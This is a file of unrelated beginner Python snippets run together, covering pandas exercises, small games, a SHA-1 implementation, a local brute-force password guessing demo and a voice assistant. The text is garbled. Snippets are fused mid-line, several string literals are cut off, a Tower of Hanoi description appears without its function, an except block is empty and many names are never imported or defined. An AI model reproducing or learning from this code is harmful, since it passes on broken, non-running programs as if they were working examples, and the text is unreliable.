unsorted_df = pd.DataFrame(np.random.randn(10, 2), index=[1, 4, 6, 2, 3, 5, 9, 8, 0, 7], columns=['col2', 'col1'])
sorted_df = unsorted_df.sort_index(axis=1)
print(sorted_df)
unsorted_df = pd.DataFrame({'col1': [2, 1, 1, 1], 'col2': [1, 3, 2, 4]})
sorted_df = unsorted_df.sort_values(by='col1', kind='mergesort')
df = pd.DataFrame(np.random.randn(8, 4),
                  index=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'], columns=['A', 'B', 'C', 'D'])
print(df.loc[:, ['A', 'C']])
print(df.loc[['a', 'b', 'f', 'h'], ['A', 'C']])
df = pd.DataFrame(np.random.randn(8, 4), columns=['A', 'B', 'C', 'D'])
print(df.ix[:, 'A'])
s = pd.Series([1, 2, 3, 4, 5, 4])
print(s.pct_change())
df = pd.DataFrame(np.random.randn(5, 2))
print(df.pct_change())
df = pd.DataFrame(np.random.randn(10, 4),
                  index=pd.date_range('1/1/2000', periods=10),
                  columns=['A', 'B', 'C', 'D'])
print(df.rolling(window=3).mean())
print(df.expanding(min_periods=3).mean())
df = pd.DataFrame(np.random.randn(3, 3), index=['a', 'c', 'e'], columns=['one',
                                                                         'two', 'three'])
df = df.reindex(['a', 'b', 'c'])
print(df)
print("NaN replaced with '0':")
print(df.fillna(0))
df = pd.DataFrame(np.random.randn(5, 3), index=['a', 'c', 'e', 'f',
                                                'h'], columns=['one', 'two', 'three'])
df = df.reindex(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'])
print(df)
print(df.fillna(method='pad'))
print(df.fillna(method='bfill'))
print(df.dropna())
print(df.dropna(axis=1))
ipl_data = {'Team': ['Riders', 'Riders', 'Devils', 'Devils', 'Kings',
                     'kings', 'Kings', 'Kings', 'Riders', 'Royals', 'Royals', 'Riders'],
            'Rank': [1, 2, 2, 3, 3, 4, 1, 1, 2, 4, 1, 2],
            'Year': [2014, 2015, 2014, 2015, 2014, 2015, 2016, 2017, 2016, 2014, 2015, 2017],
            'Points': [876, 789, 863, 673, 741, 812, 756, 788, 694, 701, 804, 690]}
df = pd.DataFrame(ipl_data)
grouped = df.groupby('Year')
for name, group in grouped:
    print(name)
    print(group)
print(grouped.get_group(2014))
grouped = df.groupby('Team')
print(grouped['Points'].agg([np.sum, np.mean, np.std]))
data = pd.read_csv("dat.csv")
print(data)
max_size = 10
print(
    "(a)" + " " * (max_size) +
    "(b)" + " " * (max_size) +
    "(c)" + " " * (max_size) +
    "(d)" + " " * (max_size)
    )
for i in range(1, max_size + 1):
    print("*" * i, end = " " * (max_size - i + 3))
    print("*" * (max_size - i + 1), end = " " * (i - 1 + 3))
    print(" " * (i - 1) + "*" * (max_size - i + 1), end = " " * 3)
    print(" " * (max_size - i) + "*" * i)
def factorial(n):
    fact = 1
    while n >= 1:
        fact = fact * n
        n = n - 1
    return fact
def permutation(n, r):
    return factorial(n) / factorial(n - r)
def combination(n, r):
    return permutation(n, r) / factorial(r)
def main():
    print('choose between operator 1,2,3')
    print('1) Factorial')
    print('2) Permutation')
    print('3) Combination')
    operation = input('\n')
    if operation == '1':
        print('Factorial Computation\n')
        while True:
            try:
                n = int(input('\n Enter  Value for n '))
                print('Factorial of {} = {}'.format(n, factorial(n)))
                break
            except ValueError:
                print('Invalid Value')
                continue
    elif operation == '2':
        print('Permutation Computation\n')
        while True:
            try:
                n = int(input('\n Enter Value for n '))
                r = int(input('\n Enter Value for r '))
                print('Permutation of {}P{} = {}'.format(n, r, permutation(n, r)))
                break
            except ValueError:
                print('Invalid Value')
                continue
    elif operation == '3':
        print('Combination Computation\n')
        while True:
            try:
                n = int(input('\n Enter Value for n '))
                r = int(input('\n Enter Value for r '))
                print('Combination of {}C{} = {}'.format(n, r, combination(n, r)))
                break
            except ValueError:
                print('Invalid Value')
                continue
if __name__ == '__main__':
    main()
import numpy as np
import matplotlib.pyplot as plt
import pandas as pd
dataset = pd.read_csv('Data.csv')
X = dataset.iloc[:, :-1].values
y = dataset.iloc[:, 3].values
from sklearn.model_selection import train_test_split
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state = 0)
from sklearn.preprocessing import StandardScaler
sc_X = StandardScaler()
X_train = sc_X.fit_transform(X_train)
X_test = sc_X.transform(X_test)
sc_y = StandardScaler()
y_train = sc_y.fit_transform(y_train)
import time
import multiprocessing
def calc_square(numbers):
    for n in numbers:
        print('square ' + str(n*n))
def calc_cube(numbers):
    for n in numbers:
        print('cube ' + str(n*n*n))
if __name__ == "__main__":
    arr = [2,3,8]
    p1 = multiprocessing.Process(target=calc_square, args=(arr,))
    p2 = multiprocessing.Process(target=calc_cube, args=(arr,))
    p1.start()
    p2.start()
    p1.join()
    p2.join()
    print("Done!")def ohms_law(v=0, i=0, r=0):
    if(v == 0):
        result = i * r
        return result
    elif(i == 0):
        result = v / r
        return result
    elif(r == 0):
        result = v / i
        return result
    else:
        return 0
import time
def time_it(func):
    def wrapper(*args, **kwargs):
        start = time.time()
        result = func(*args,**kwargs)
        end = time.time()
        print(func.__name__ +" took " + str((end-start)*1000) + "mil sec")
        return result
    return wrapper
def calc_square(numbers):
    result = []
    for number in numbers:
        result.append(number*number)
    return result
def calc_cube(numbers):
    result = []
    for number in numbers:
        result.append(number*number*number)
    return result
array = range(1,100000)
out_square = calc_square(array)
out_cube = calc_cube(array)
import numpy as np
a=np.array([[1,2,3],[4,5,6]])
import turtle
t = turtle.Turtle()
t.left(90)
t.speed(200)
def tree(i):
    if i<10:
        return
    else:
        t.forward(i)
        t.left(30)
        tree(3*i/4)
        t.right(60)
        tree(3*i/4)
        t.left(30)
        t.backward(i)
tree(100)
turtle.done()
host = "localhost"
mongoPort = 27017
SOCKS5_PROXY_PORT = 1080
auth = ""
passcode = ""
def is_leap(year):
    leap = False
    if (year%4 == 0):
        leap = True
        if (year%100 == 0):
            leap = False
            if (year%400 == 0):
                leap = True
    return leap
year = int(input("Enter the year here: "))
print(is_leap(year))
import requests
import pyttsx3
engine = pyttsx3.init()
voices = engine.getProperty('voices')
engine.setProperty('voice', voices[0].id)
def speak(audio):
    engine.say(audio)
    engine.runAndWait()
url = 'https://www.cricbuzz.com/cricket-news/latest-news'
ans = requests.get(url)
soup = BeautifulSoup(ans.content, 'html.parser')
anchors = soup.find_all('a', class_='cb-nws-hdln-ancr text-hvr-underline')
i = 1
speak('Welcome to sports news headlines!')
for anchor in anchors:
    speak(anchor.get_text())
    i+=1
    if i==11:
        break; 
    speak('Moving on next sports headline..')
speak('These all are major headlines, have a nice day SIR')
from itertools import product
def findPassword(chars, function, show=50, format_="%s"):
    password = None
    attempts = 0
    size = 1
    stop = False
    while not stop:
        for pw in product(chars, repeat=size):
            password = "".join(pw)
            if attempts % show == 0:
                print(format_ % password)
            if function(password):
                stop = True
                break
            else:
                attempts += 1
        size += 1
    return password, attempts
def getChars():
    chars = []
    for id_ in range(ord("A"), ord("Z") + 1):
        chars.append(chr(id_))
    for id_ in range(ord("a"), ord("z") + 1):
        chars.append(chr(id_))
    for number in range(10):
        chars.append(str(number))
    return chars
if __name__ == "__main__":
    import datetime
    import time
    pw = input("\n Type a password: ")
    print("\n")
    def testFunction(password):
        global pw
        if password == pw:
            return True
        else:
            return False
    chars = getChars()
    t = time.process_time()
    password, attempts = findPassword(chars, testFunction, show=1000, format_=" Trying %s")
    t = datetime.timedelta(seconds=int(time.process_time() - t))
    input(f"\n\n Password found: {password}\n Attempts: {attempts}\n Time: {t}\n")
import cv2
cap = cv2.VideoCapture(0)
frames_width = int(cap.get(3))
frames_height = int(cap.get(4))
fourcc = cv2.VideoWriter_fourcc(*'MJPG')
out = cv2.VideoWriter('recording.avi', fourcc, 20.0, (frames_width, frames_height))
while (True):
    ret, frame = cap.read()
    if ret == True:
        out.write(frame)
        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
        cv2.imshow('frame', gray)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
cap.release()
out.release()
cv2.destroyAllWindows()
import random
import simplegui
def new_game():
    global card3, po, state, exposed, card1
    def create(card):
        while len(card) != 8:
            num = random.randrange(0, 8)
            if num not in card:
                card.append(num)
        return card
    card3 = []
    card1 = []
    card2 = []
    po = []
    card1 = create(card1)
    card2 = create(card2)
    card1.extend(card2)
    random.shuffle(card1)
    state = 0
    exposed = []
    for i in range(0, 16, 1):
        exposed.insert(i, False)
def mouseclick(pos):
    global card3, po, state, exposed, card1
    if state == 2:
        if card3[0] != card3[1]:
            exposed[po[0]] = False
            exposed[po[1]] = False
        card3 = []
        state = 0
        po = []
    ind = pos[0] // 50
    card3.append(card1[ind])
    po.append(ind)
    if exposed[ind] == False and state < 2:
        exposed[ind] = True
        state += 1
def draw(canvas):
    global card1
    gap = 0
    for i in range(0, 16, 1):
        if exposed[i] == False:
            canvas.draw_polygon([[0 + gap, 0], [0 + gap, 100], [50 + gap, 100], [50 + gap, 0]], 1, "Black", "Green")
        elif exposed[i] == True:
            canvas.draw_text(str(card1[i]), [15 + gap, 65], 50, 'White')
        gap += 50
frame = simplegui.create_frame("Memory", 800, 100)
frame.add_button("Reset", new_game)
label = frame.add_label("Turns = 0")
frame.set_mouseclick_handler(mouseclick)
frame.set_draw_handler(draw)
new_game()
frame.start()
from random import randint
case = randint(1, 2)
number = randint(1, 99)
specialCharacters = ( "!", "@", "
animals = (
"ant", "alligator", "baboon", "badger", "barb", "bat", "beagle", "bear", "beaver", "bird", "bison", "bombay", "bongo",
"booby", "butterfly", "bee", "camel", "cat", "caterpillar", "catfish", "cheetah", "chicken", "chipmunk", "cow", "crab",
"deer", "dingo", "dodo", "dog", "dolphin", "donkey", "duck", "eagle", "earwig", "elephant", "emu", "falcon", "ferret",
"fish", "flamingo", "fly", "fox", "frog", "gecko", "gibbon", "giraffe", "goat", "goose", "gorilla")
colour = (
"red", "orange", "yellow", "green", "blue", "indigo", "violet", "purple", "magenta", "cyan", "pink", "brown", "white",
"grey", "black")
chosenanimal = animals[randint(0, len(animals) - 1)] 
chosencolour = colour[randint(0, len(colour) - 1)]
chosenSpecialCharacter = specialCharacters[randint(0, len(specialCharacters) - 1)] 
if case == 1:
    chosenanimal = chosenanimal.upper()
    print(chosencolour, number , chosenanimal, chosenSpecialCharacter)
else:
    chosencolour = chosencolour.upper()
    print(chosenanimal, number, chosencolour, chosenSpecialCharacter)
import time
import random
name = input("What is your name? ")
print ("\nHello, " + name+ "\nTime to play hangman!\n")
time.sleep(1)
print ("Start guessing...\nHint:It is a fruit")
time.sleep(0.5)
someWords = someWords.split(' ') 
word = random.choice(someWords)
guesses = ''
turns = 5
while turns > 0:         
    failed = 0             
    for char in word:      
        if char in guesses:    
            print (char, end = ' ')  
        else:
            print ("_", end = ' ')    
            failed += 1    
    if failed == 0:        
        print ("\nYou won")  
        break              
    print
    guess = input("\nGuess a character:") 
    if not guess.isalpha(): 
        print('Enter only a LETTER') 
        continue
    elif len(guess) > 1: 
        print('Enter only a SINGLE letter') 
        continue
    elif guess in guesses: 
        print('You have already guessed that letter') 
        continue
    guesses += guess                    
    if guess not in word:  
        turns -= 1        
        print ("\nWrong")    
        print ("You have", + turns, 'more guesses\n') 
        if turns == 0:           
            print ("\nYou Loose")  
import PyPDF2
import pyttsx3
book = open(input('Enter the book name: '), 'rb')
pg_no = int(input("Enter the page number from which you want the system to start reading text: "))
pdf_Reader = PyPDF2.PdfFileReader(book)
pages = pdf_Reader.numPages
speaker = pyttsx3.init()
for num in range((pg_no-1), pages):
    page = pdf_Reader.getPage(num)
    text = page.extractText()
    speaker.say(text)
    speaker.runAndWait()
from __future__ import print_function
import os
def isSQLite3(filename):
    from os.path import isfile, getsize
    if not isfile(filename):
        return False
    if getsize(filename) < 100:  
        return False
    else:
        fd = open(filename, 'rb')
        header = fd.read(100)
        fd.close()
        if header[0:16] == 'SQLite format 3\000':
            return True
        else:
            return False
log = open('sqlite_audit.txt', 'w')
for r, d, f in os.walk(r'.'):
    for files in f:
        if isSQLite3(files):
            print(files)
            print("[+] '%s' **** is a SQLITE database file **** " % os.path.join(r, files))
            log.write("[+] '%s' **** is a SQLITE database file **** " % files + '\n')
        else:
            log.write("[-] '%s' is NOT a sqlite database file" % os.path.join(r, files) + '\n')
            log.write("[-] '%s' is NOT a sqlite database file" % files + '\n')
import os
import shutil
ext = {
    "web": "css less scss wasm ",
    "audio": "aac aiff ape au flac gsm it m3u m4a mid mod mp3 mpa pls ra s3m sid wav wma xm ",
    "code": "c cc class clj cpp cs cxx el go h java lua m m4 php pl po py rb rs swift vb vcxproj xcodeproj xml diff patch html js ",
    "slide": "ppt odp ",
    "sheet": "ods xls xlsx csv ics vcf ",
    "image": "3dm 3ds max bmp dds gif jpg jpeg png psd xcf tga thm tif tiff ai eps ps svg dwg dxf gpx kml kmz webp ",
    "archiv": "7z a apk ar bz2 cab cpio deb dmg egg gz iso jar lha mar pea rar rpm s7z shar tar tbz2 tgz tlz war whl xpi zip zipx xz pak ",
    "book": "mobi epub azw1 azw3 azw4 azw6 azw cbr cbz ",
    "text": "doc docx ebook log md msg odt org pages pdf rtf rst tex txt wpd wps ",
    "exec": "exe msi bin command sh bat crx ",
    "font": "eot otf ttf woff woff2 ",
    "video": "3g2 3gp aaf asf avchd avi drc flv m2v m4p m4v mkv mng mov mp2 mp4 mpe mpeg mpg mpv mxf nsv ogg ogv ogm qt rm rmvb roq srt svi vob webm wmv yuv ",
}
for key, value in ext.items():
    value = value.split()
    ext[key] = value
def add_to_dir(ex, src_path, path):
    file_with_ex = os.path.basename(src_path)
    file_without_ex = file_with_ex[: file_with_ex.find(ex) - 1]
    for cat, extensions in ext.items():
        if ex in extensions:
            os.chdir(path)
            dest_path = path + "\\" + cat
            if cat in os.listdir():
                try:
                    shutil.move(src_path, dest_path)
                except shutil.Error:
                    renamed_file = rename(file_without_ex, ex, dest_path)
                    os.chdir(path)
                    os.rename(file_with_ex, renamed_file)
                    os.chdir(dest_path)
                    shutil.move(path + "\\" + renamed_file, dest_path)
            else:
                os.mkdir(cat)
                try:
                    shutil.move(src_path, dest_path)
                except Exception as e:
                if os.path.exists(src_path):
                    os.unlink(src_path)
def rename(search, ex, dest_path):
    count = 0
    os.chdir(dest_path)
    for filename in os.listdir():
        if filename.find(search, 0, len(search) - 1):
            count = count + 1
    return search + str(count) + "." + ex
a = int(input("Enter number 1 (a): "))
b = int(input("Enter number 2 (b): "))
i = 1
while(i <= a and i <= b):
    if(a % i == 0 and b % i == 0):
        gcd = i
    i = i + 1
print("\nGCD of {0} and {1} = {2}".format(a, b, gcd))
def lis(a):
	n=len(a)
	ans=[1]*n
	for i in range(1,n):
		for j in range(i):
			if a[i]>a[j] and ans[i]<ans[j]+1:
				ans[i]=ans[j]+1
	return max(ans)
a=[1,3,2,6,4]
print("Maximum Length of longest increasing subsequence ",lis(a))
import requests
from bs4 import BeautifulSoup
archive_url = "http://www-personal.umich.edu/~csev/books/py4inf/media/"
def get_video_links():
    r = requests.get(archive_url)
    soup = BeautifulSoup(r.content, 'html5lib')
    links = soup.findAll('a')
    video_links = [archive_url + link['href'] for link in links if link['href'].endswith('mp4')]
    return video_links
def download_video_series(video_links):
    for link in video_links:
        file_name = link.split('/')[-1]
        print("Downloading the file:%s" % file_name)
        r = requests.get(link, stream=True)
        with open(file_name, 'wb') as f:
            for chunk in r.iter_content(chunk_size=1024 * 1024):
                if chunk:
                    f.write(chunk)
        print("%s downloaded!\n" % file_name)
    print("All videos are downloaded!")
    return
if __name__ == "__main__":
    video_links = get_video_links()
    download_video_series(video_links)
from appJar import gui
def press():
    sayi = p.integerBox('Sayı penceresi', 'Mesaj', parent=None)
    print(sayi)
p = gui()
p.setSize(300,200)
p.addButton('Buton', press)
p.go()from sys import argv
try:
    from urllib.error import URLError
    from urllib.request import urlopen
except ImportError:
    from urllib2 import URLError, urlopen
def checkInternetConnectivity():
    try:
        url = argv[1]
        if "https://" or "http://" not in url:
            url = "https://" + url
    except BaseException:
        url = "https://google.com"
    try:
        urlopen(url, timeout=2)
        print(f'Connection to "{url}" is working')
    except URLError as E:
        print("Connection error:%s" % E.reason)
checkInternetConnectivity()
import os
from tkinter.filedialog import askdirectory
import pygame
from mutagen.id3 import ID3
from tkinter import *
root = Tk()
root.minsize(300,300)
listofsongs = []
realnames = []
v = StringVar()
songlabel = Label(root,textvariable=v,width=35)
index = 0
def directorychooser():
    directory = askdirectory()
    os.chdir(directory)
    for files in os.listdir(directory):
        if files.endswith(".mp3"):
            realdir = os.path.realpath(files)
            audio = ID3(realdir)
            realnames.append(audio['TIT2'].text[0])
            listofsongs.append(files)
    pygame.mixer.init()
    pygame.mixer.music.load(listofsongs[0])
directorychooser()
def updatelabel():
    global index
    global songname
    v.set(realnames[index])
def nextsong(event):
    global index
    index += 1
    pygame.mixer.music.load(listofsongs[index])
    pygame.mixer.music.play()
    updatelabel()
def prevsong(event):
    global index
    index -= 1
    pygame.mixer.music.load(listofsongs[index])
    pygame.mixer.music.play()
    updatelabel()
def stopsong(event):
    pygame.mixer.music.stop()
    v.set("")
label = Label(root,text='Music Player')
label.pack()
listbox = Listbox(root)
listbox.pack()
realnames.reverse()
for items in realnames:
    listbox.insert(0,items)
realnames.reverse()
nextbutton = Button(root,text = 'Next Song')
nextbutton.pack()
previousbutton = Button(root,text = 'Previous Song')
previousbutton.pack()
stopbutton = Button(root,text='Stop Music')
stopbutton.pack()
nextbutton.bind("<Button-1>",nextsong)
previousbutton.bind("<Button-1>",prevsong)
stopbutton.bind("<Button-1>",stopsong)
songlabel.pack()
root.mainloop()
class Node:
    def __init__(self, data):
        self.data = data
        self.next = None
class Reverse_Linked_List:
    def __init__(self):
        self.head = None
    def Insert_At_End(self, new_data):
        new_node = Node(new_data)
        if self.head is None:
            self.head = new_node
            return
        current = self.head
        while(current.next):
            current = current.next
        current.next = new_node
    def Reverse_list_Groups(self, head, k):
        count = 0
        previous = None
        current = head
        while (current is not None and count < k):
            following = current.next
            current.next = previous
            previous = current
            current = following
            count += 1 
        if following is not None:
            head.next = self.Reverse_list_Groups(following, k)
        return previous
    def Display(self):
        temp = self.head
        while(temp):
            print(temp.data, "->", end=" ")
            temp = temp.next
        print("None")
if __name__ == "__main__":
    L_list = Reverse_Linked_List()
    L_list.Insert_At_End(1)
    L_list.Insert_At_End(2)
    L_list.Insert_At_End(3)
    L_list.Insert_At_End(4)
    L_list.Insert_At_End(5)
    L_list.Insert_At_End(6)
    L_list.Insert_At_End(7)
    L_list.Display()
    L_list.head = L_list.Reverse_list_Groups(L_list.head, 2)
    print("\nReverse Linked List: ")
    the entire stack to another rod, obeying the following simple rules:
1) Only one disk can be moved at a time.
2) Each move consists of taking the upper disk from one of the stacks and placing it on top of another stack i.e. a disk
    can only be moved if it is the uppermost disk on a stack.
3) No disk may be placed on top of a smaller disk.
APPROACH:
Take an example for 2 disks :
Let rod 1 = 'SOURCE', rod 2 = 'TEMPORARY', rod 3 = 'DESTINATION'.
Step 1 : Shift first disk from 'SOURCE' to 'TEMPORARY'.
Step 2 : Shift second disk from 'SOURCE' to 'DESTINATION'.
Step 3 : Shift first disk from 'TEMPORARY' to 'DESTINATION'.
The pattern here is :
Shift 'n-1' disks from 'SOURCE' to 'TEMPORARY'.
Shift last disk from 'SOURCE' to 'DESTINATION'.
Shift 'n-1' disks from 'TEMPORARY' to 'DESTINATION'.
        if n<0:
            print("Try Again with a valid input")
            continue
        elif n==0:
            break
        toh(n,'Source','Temporary','Destination')
        print('ENTER 0 TO EXIT')
def levenshtein_dis(wordA, wordB):
    wordA = wordA.lower()                       
    wordB = wordB.lower()                       
    length_A = len(wordA)
    length_B = len(wordB)
    max_len = 0
    diff = 0
    distances = []
    distance = 0
    if length_A > length_B:
        diff =  length_A - length_B
        max_len = length_A
    elif length_A < length_B:
        diff = length_B - length_A
        max_len = length_B
    else:
        diff = 0
        max_len = length_A
    for x in range(max_len-diff):
        if wordA[x] != wordB[x]:
            distance += 1
    distances.append(distance)
    distance = 0
    for x in range(max_len-diff):
        if wordA[-(x+1)] != wordB[-(x+1)]:
            distance += 1
    distances.append(distance)
    diff = diff + min(distances)
    return diff
from __future__ import print_function
import os  
import sys  
def usage():
    print('[-] Usage: python check_file.py [filename1] [filename2] ... [filenameN]')
def readfile(filename):
    with open(filename, 'r') as f:  
        read_file = f.read()  
    print(read_file)
    print('
def main():
    if len(sys.argv) >= 2:
        file_names = sys.argv[1:]
        filteredfilenames_1 = list(file_names)  
        filteredfilenames_2 = list(file_names)
        for filename in filteredfilenames_1:
            if not os.path.isfile(filename):  
                print('[-] ' + filename + ' does not exist.')
                filteredfilenames_2.remove(filename)  
                continue
            if not os.access(filename, os.R_OK):
                print('[-] ' + filename + ' access denied')
                filteredfilenames_2.remove(filename)
                continue
        for filename in filteredfilenames_2:
            print('[+] Reading from : ' + filename)
            readfile(filename)
    else:
        usage()  
if __name__ == '__main__':
    main()
with open("stocks.csv", "r") as f, open("output.csv", "w") as out:
    out.write("Company Name,PE Ratio, PB Ratio\n")
    next(f)  
    for line in f:
        tokens = line.split(",")
        stock = tokens[0]
        price = float(tokens[1])
        eps = float(tokens[2])
        book = float(tokens[3])
        pe = round(price / eps, 2)
        pb = round(price / book, 2)
        out.write(f"{stock},{pe},{pb}\n")
from appJar import gui
def press():
    p.errorBox('Hata', 'Hata!', parent=None)
p = gui()
p.setSize(300,200)
p.addButton('Buton', press)
p.go()
import pandas as pd
import os
import tabula
from docx.api import Document
if os.path.isdir('Parent')== True:
    os.chdir('Parent')
if os.path.isdir('Child1')==True:
    os.chdir('Child1')
if os.path.isfile('Pdf1_Child1.pdf')==True:
    df_pdf_child1=tabula.read_pdf('Pdf1_Child1.pdf',pages='all')
if os.path.isfile('Document_Child1.docx')==True:
    document = Document('Document_Child1.docx')
    table = document.tables[0]
    data = []
    keys = None
    for i, row in enumerate(table.rows):
        text = (cell.text for cell in row.cells)
        if i == 0:
            keys = tuple(text)
            continue
        row_data = dict(zip(keys, text))
        data.append(row_data)
df_document_child1=pd.DataFrame(data)
if os.path.isfile('Text_Child1.txt')==True:
    df_text_child1=pd.read_csv('Text_Child1.txt')
df_text_child1
os.chdir('../')
if os.path.isdir('Parent')== True:
    os.chdir('Parent')
if os.path.isdir('Child2')==True:
    os.chdir('Child2')
if os.path.isfile('Pdf1_Child2.pdf')==True:
    df_pdf_child2=tabula.read_pdf('Pdf1_Child2.pdf',pages='all')
if os.path.isfile('Document_Child2.docx')==True:
    document = Document('Document_Child2.docx')
    table = document.tables[0]
    data = []
    keys = None
    for i, row in enumerate(table.rows):
        text = (cell.text for cell in row.cells)
        if i == 0:
            keys = tuple(text)
            continue
        row_data = dict(zip(keys, text))
        data.append(row_data)
df_document_child2=pd.DataFrame(data)
if os.path.isfile('Text_Child2.txt')==True:
    df_text_child2=pd.read_csv('Text_Child2.txt')
df_pdf_child2[0].head(4)
os.chdir('../')
if os.path.isdir('Parent')== True:
    os.chdir('Parent')
if os.path.isdir('Child3')==True:
    os.chdir('Child3')
if os.path.isfile('Pdf1_Child3.pdf')==True:
    df_pdf_child3=tabula.read_pdf('Pdf1_Child3.pdf',pages='all')
if os.path.isfile('Document_Child3.docx')==True:
    document = Document('Document_Child3.docx')
    table = document.tables[0]
    data = []
    keys = None
    for i, row in enumerate(table.rows):
        text = (cell.text for cell in row.cells)
        if i == 0:
            keys = tuple(text)
            continue
        row_data = dict(zip(keys, text))
        data.append(row_data)
df_document_child3=pd.DataFrame(data)
if os.path.isfile('Text_Child3.txt')==True:
    df_text_child3=pd.read_csv('Text_Child3.txt')
df_text_child3
import argparse
import hashlib  
import struct
import unittest
class SHA1Hash:
    def __init__(self, data):
        self.data = data
        self.h = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0]
    def rotate(n, b):
        return ((n << b) | (n >> (32 - b))) & 0xffffffff
    def padding(self):
        padding = b'\x80' + b'\x00' * (63 - (len(self.data) + 8) % 64)
        padded_data = self.data + padding + struct.pack('>Q', 8 * len(self.data))
        return padded_data
    def split_blocks(self):
        return [self.padded_data[i:i + 64] for i in range(0, len(self.padded_data), 64)]
    def expand_block(self, block):
        w = list(struct.unpack('>16L', block)) + [0] * 64
        for i in range(16, 80):
            w[i] = self.rotate((w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]), 1)
        return w
    def final_hash(self):
        self.padded_data = self.padding()
        self.blocks = self.split_blocks()
        for block in self.blocks:
            expanded_block = self.expand_block(block)
            a, b, c, d, e = self.h
            for i in range(0, 80):
                if 0 <= i < 20:
                    f = (b & c) | ((~b) & d)
                    k = 0x5A827999
                elif 20 <= i < 40:
                    f = b ^ c ^ d
                    k = 0x6ED9EBA1
                elif 40 <= i < 60:
                    f = (b & c) | (b & d) | (c & d)
                    k = 0x8F1BBCDC
                elif 60 <= i < 80:
                    f = b ^ c ^ d
                    k = 0xCA62C1D6
                a, b, c, d, e = self.rotate(a, 5) + f + e + k + expanded_block[i] & 0xffffffff, \
                                a, self.rotate(b, 30), c, d
        self.h = self.h[0] + a & 0xffffffff, \
                 self.h[1] + b & 0xffffffff, \
                 self.h[2] + c & 0xffffffff, \
                 self.h[3] + d & 0xffffffff, \
                 self.h[4] + e & 0xffffffff
        return '%08x%08x%08x%08x%08x' % tuple(self.h)
class SHA1HashTest(unittest.TestCase):
    def testMatchHashes(self):
        msg = bytes('Test String', 'utf-8')
        self.assertEqual(SHA1Hash(msg).final_hash(), hashlib.sha1(msg).hexdigest())
def main():
    parser = argparse.ArgumentParser(description='Process some strings or files')
    parser.add_argument('--string', dest='input_string',
                        default='Hello World!! Welcome to Cryptography',
                        help='Hash the string')
    parser.add_argument('--file', dest='input_file', help='Hash contents of a file')
    args = parser.parse_args()
    input_string = args.input_string
    if args.input_file:
        hash_input = open(args.input_file, 'rb').read()
    else:
        hash_input = bytes(input_string, 'utf-8')
    print(SHA1Hash(hash_input).final_hash())
if __name__ == '__main__':
    main()
def bubble_sort(Lists):
    for i in range(len(Lists)):
        for j in range(len(Lists)-1):
            if Lists[j]>Lists[j+1]:
                Lists[j], Lists[j+1] = Lists[j+1], Lists[j]
array = []
array_length = int(input(print("Enter the number of elements of array or enter the length of array")))
for i in range(array_length):
    value = int(input(print("Enter the value in the array")))
    array.append(value)
bubble_sort(array)    
print(array)
__author__ = 'Mohammed Shokr <mohammedshokr2014@gmail.com>'
__version__ = 'v 0.1'
from datetime import datetime  
import subprocess  
import pyjokes
import requests
import json
from pynut import keyboard
from playsound import *  
import speech_recognition as sr  
import pyttsx3
import webbrowser
engine = pyttsx3.init()
voices = engine.getProperty('voices')
engine.setProperty('voice', voices[0].id)
engine.setProperty('rate', 150)
def speak_news():
    url = 'http://newsapi.org/v2/top-headlines?sources=the-times-of-india&apiKey=yourapikey'
    news = requests.get(url).text
    news_dict = json.loads(news)
    arts = news_dict['articles']
    speak('Source: The Times Of India')
    speak('Todays Headlines are..')
    for index, articles in enumerate(arts):
        speak(articles['title'])
        if index == len(arts)-1:
            break
        speak('Moving on the next news headline..')
    speak('These were the top headlines, Have a nice day Sir!!..')
def sendEmail(to, content):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.login('youremail@gmail.com', 'yourr-password-here')
    server.sendmail('youremail@gmail.com', to, content)
    server.close()
r = sr.Recognizer()
with sr.Microphone() as source:
    print('[JARVIS]:' + "Say something")
    engine.say("Say something")
    engine.runAndWait()
    audio = r.listen(source)
def voice(p):
    myobj=gTTS(text=p,lang='en',slow=False)
    myobj.save('try.mp3')
    playsound('try.mp3')
Query = r.recognize_google(audio, language = 'en-IN', show_all = True )
print(Query)
class Jarvis:
    def __init__(self, Q):
        self.query = Q
    def sub_call(self, exe_file):
        return subprocess.call([exe_file])
    def get_dict(self):
        _dict = dict(
            time=datetime.now(),
            notepad='Notepad.exe',
            calculator='calc.exe',
            stickynot='StickyNot.exe',
            shell='powershell.exe',
            paint='mspaint.exe',
            cmd='cmd.exe',
            browser='C:\Program Files\Internet Explorer\iexplore.exe',
        )
        return _dict
    def get_app(self):
        task_dict = self.get_dict()
        task = task_dict.get(self.query, None)
        if task is None:
            engine.say("Sorry Try Again")
            engine.runAndWait()
        else:
            if 'exe' in str(task):
                return self.sub_call(task)
            print(task)
            return
def get_app(Q):
    if Q == "time":
        print(datetime.now())
        x=datetime.now()
        voice(x)
    elif Q=="news":
        speak_news()
    elif Q == "open notepad":
        subprocess.call(['Notepad.exe'])
    elif Q == "open calculator":
        subprocess.call(['calc.exe'])
    elif Q == "open stikynot":
        subprocess.call(['StikyNot.exe'])
    elif Q == "open shell":
        subprocess.call(['powershell.exe'])
    elif Q == "open paint":
        subprocess.call(['mspaint.exe'])
    elif Q == "open cmd":
        subprocess.call(['cmd.exe'])
    elif Q == "open discord":
        subprocess.call(['discord.exe'])
    elif Q == "open browser":
        subprocess.call(['C:\Program Files\Internet Explorer\iexplore.exe'])
    elif Q == "open youtube":
        webbrowser.open("https://www.youtube.com/")   
    elif Q == "open google":
        webbrowser.open("https://www.google.com/") 
    elif Q == "open github":
        webbrowser.open
    elif Q == "email to other":                     
            try: 
                speak("What should I say?")
                r = sr.Recognizer()
                with sr.Microphone() as source:
                    print("Listening...")
                    r.pause_threshold = 1
                    audio = r.listen(source)
                to = "abc@gmail.com" 
                sendEmail(to, content)
                speak("Email has been sent!")
            except Exception as e:
                speak("Sorry, I can't send the email.")
    elif Q=="Take screenshot":
        snapshot=ImageGrab.grab()
        drive_letter = "C:\\"
        folder_name = r'downloaded-files'
        folder_time = datetime.datetime.now().strftime("%Y-%m-%d_%I-%M-%S_%p")
        extention = '.jpg'
        folder_to_save_files = drive_letter + folder_name + folder_time + extention
        snapshot.save(folder_to_save_files)
